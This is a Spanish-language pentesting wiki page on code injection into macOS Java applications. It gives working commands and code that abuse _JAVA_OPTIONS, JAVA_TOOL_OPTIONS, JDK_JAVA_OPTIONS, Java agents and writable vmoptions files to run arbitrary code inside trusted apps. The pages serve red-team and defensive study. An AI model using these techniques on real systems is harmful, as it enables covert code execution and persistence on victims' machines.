# Inyección en aplicaciones Java

{{#include ../../../banners/hacktricks-training.md}}

## Enumeración

Busca las aplicaciones Java instaladas en tu sistema. Se observó que las aplicaciones Java en **Info.plist** contendrán algunos parámetros de Java que incluyen la cadena **`java.`**, por lo que puedes buscarla:
```bash
# Search only in /Applications folder
sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null

# Full search
sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
```
## \_JAVA_OPTIONS

La variable de entorno **`_JAVA_OPTIONS`** puede utilizarse para inyectar parámetros arbitrarios de Java VM cuando se inicia una aplicación Java.<sup>[[1]](#references)</sup>

La pila de lanzamiento de Java también reconoce dos variables mejor definidas con diferentes ámbitos:

- `JAVA_TOOL_OPTIONS` se lee cuando se crea la VM, incluidas algunas rutas de lanzamiento integradas que no pasan por el lanzador `java`. Puede inyectar opciones de instrumentación como `-javaagent`, `-agentlib` o `-agentpath`.<sup>[[4]](#references)</sup>
- `JDK_JAVA_OPTIONS` se antepone mediante el lanzador `java` a su línea de comandos. Las opciones que seleccionan la clase principal o terminan el lanzador están prohibidas, pero `-javaagent` se acepta.<sup>[[5]](#references)</sup>

Las tres variables deben tratarse como controles de ejecución de código de la JVM cuando un atacante también puede proporcionar un agent compatible y legible. `_JAVA_OPTIONS` es un detalle de implementación de HotSpot, por lo que debe validarse con el proveedor y la versión exactos; `JAVA_TOOL_OPTIONS` o `JDK_JAVA_OPTIONS` son preferibles para realizar pruebas portables.
```bash
# Write your payload in a script called /tmp/payload.sh
export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
```
Para ejecutarlo como un proceso nuevo y no como un proceso hijo del terminal actual, puedes usar:
```objectivec
#import <Foundation/Foundation.h>
// clang -fobjc-arc -framework Foundation invoker.m -o invoker

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Specify the file path and content
NSString *filePath = @"/tmp/payload.sh";
NSString *content = @"#!/bin/bash\n/Applications/iTerm.app/Contents/MacOS/iTerm2";

NSError *error = nil;

// Write content to the file
BOOL success = [content writeToFile:filePath
atomically:YES
encoding:NSUTF8StringEncoding
error:&error];

if (!success) {
NSLog(@"Error writing file at %@\n%@", filePath, [error localizedDescription]);
return 1;
}

NSLog(@"File written successfully to %@", filePath);

// Create a new task
NSTask *task = [[NSTask alloc] init];

/// Set the task's launch path to use the 'open' command
[task setLaunchPath:@"/usr/bin/open"];

// Arguments for the 'open' command, specifying the path to Android Studio
[task setArguments:@[@"/Applications/Android Studio.app"]];

// Define custom environment variables
NSDictionary *customEnvironment = @{
@"_JAVA_OPTIONS": @"-Xms2m -Xmx5m -XX:OnOutOfMemoryError=/tmp/payload.sh"
};

// Get the current environment and merge it with custom variables
NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary:[[NSProcessInfo processInfo] environment]];
[environment addEntriesFromDictionary:customEnvironment];

// Set the task's environment
[task setEnvironment:environment];

// Launch the task
[task launch];
}
return 0;
}
```
Sin embargo, esa técnica provoca un error en la aplicación ejecutada. Una alternativa más sigilosa es crear un Java agent y usar `-javaagent`:<sup>[[2]](#references)</sup>
```bash
export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"

# The same agent with the standardized VM initialization variable:
JAVA_TOOL_OPTIONS='-javaagent:/tmp/Agent.jar' java -jar /path/to/application.jar

# Or through the JDK java launcher:
JDK_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar' java -jar /path/to/application.jar
```
> [!CAUTION]
> Crear el agente con una **versión de Java diferente** a la de la aplicación puede bloquear tanto el agente como la aplicación.

Dónde puede estar el agente:
```java:Agent.java
import java.io.*;
import java.lang.instrument.*;

public class Agent {
public static void premain(String args, Instrumentation inst) {
try {
String[] commands = new String[] { "/usr/bin/open", "-a", "Calculator" };
Runtime.getRuntime().exec(commands);
}
catch (Exception err) {
err.printStackTrace();
}
}
}
```
Para compilar el agente, ejecuta:
```bash
javac Agent.java # Create Agent.class
jar cvfm Agent.jar manifest.txt Agent.class # Create Agent.jar
```
Con `manifest.txt`:
```
Premain-Class: Agent
Agent-Class: Agent
Can-Redefine-Classes: true
Can-Retransform-Classes: true
```
Y luego exporta la variable de entorno y ejecuta la aplicación Java de esta forma:
```bash
export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
```
## archivo vmoptions

Este archivo permite especificar **parámetros de Java** cuando se ejecuta Java. Puedes utilizar algunas de las técnicas anteriores para cambiar los parámetros de Java y **hacer que el proceso ejecute comandos arbitrarios**.\
Además, este archivo también puede **incluir otros archivos** mediante la directiva `include`, por lo que también puedes modificar un archivo incluido.

Es más, algunas aplicaciones Java **cargarán más de un archivo `vmoptions`**.

Algunas aplicaciones, como Android Studio, indican en su **salida dónde buscan** estos archivos:<sup>[[3]](#references)</sup>
```bash
/Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions

2023-12-13 19:53:23.920 studio[74913:581359] fullFileName is: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] fullFileName exists: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.921 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app.vmoptions
2023-12-13 19:53:23.922 studio[74913:581359] parseVMOptions: /Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
2023-12-13 19:53:23.923 studio[74913:581359] parseVMOptions: platform=20 user=1 file=/Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
```
Si no lo hacen, puedes comprobarlo con:
```bash
# Monitor
sudo eslogger lookup | grep vmoption # Give FDA to the Terminal

# Launch the Java app
/Applications/Android\ Studio.app/Contents/MacOS/studio
```
Ten en cuenta que Android Studio en este ejemplo intenta cargar **`/Applications/Android Studio.app.vmoptions`**, una ubicación donde cualquier usuario del grupo **`admin` tiene permisos de escritura**.

## References

- [1] [OpenJDK — análisis de `_JAVA_OPTIONS` en `arguments.cpp`](https://cr.openjdk.org/~never/bsd_headers/src/share/vm/runtime/arguments.cpp.html)
- [2] [Oracle Java — especificación del paquete `java.lang.instrument`](https://docs.oracle.com/javase/8/docs/api/java/lang/instrument/package-summary.html)
- [3] [JetBrains — Configuración de las opciones de JVM y las propiedades de la plataforma](https://intellij-support.jetbrains.com/hc/en-us/articles/206544869-Configuring-JVM-options-and-platform-properties)
- [4] [Oracle Java — `JAVA_TOOL_OPTIONS`](https://docs.oracle.com/javase/8/docs/technotes/guides/troubleshoot/envvars002.html)
- [5] [El lanzador `java` — `JDK_JAVA_OPTIONS`](https://docs.oracle.com/en/java/javase/25/docs/specs/man/java.html#using-the-jdk_java_options-launcher-environment-variable)
{{#include ../../../banners/hacktricks-training.md}}
